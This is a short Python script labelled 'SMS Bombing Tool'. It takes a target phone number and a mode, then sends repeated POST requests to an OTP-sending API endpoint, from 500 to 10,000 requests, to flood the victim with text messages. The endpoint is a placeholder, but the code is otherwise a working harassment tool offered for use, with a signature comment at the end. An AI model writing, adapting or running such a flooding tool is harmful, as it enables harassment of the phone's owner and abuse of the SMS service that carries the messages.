import requests
import argparse

def send_sms(phone_number, count):
    url = "https://example.com/api/send_otp"
    data = {"phone_number": phone_number}
    
    for _ in range(count):
        response = requests.post(url, data=data)
        print(f"Sent SMS to {phone_number}, Status Code: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMS Bombing Tool")
    parser.add_argument("-p", "--phone", type=str, required=True, help="Target phone number")
    parser.add_argument("-m", "--mode", type=str, choices=["e", "m", "h", "ex"], required=True, help="Bombing mode: e (easy), m (medium), h (hard), ex (extreme)")
    
    args = parser.parse_args()
    
    modes = {"e": 500, "m": 1000, "h": 2000, "ex": 10000}
    count = modes[args.mode]
    
    send_sms(args.phone, count)


    # Simple CPT Code 
    #X21Empire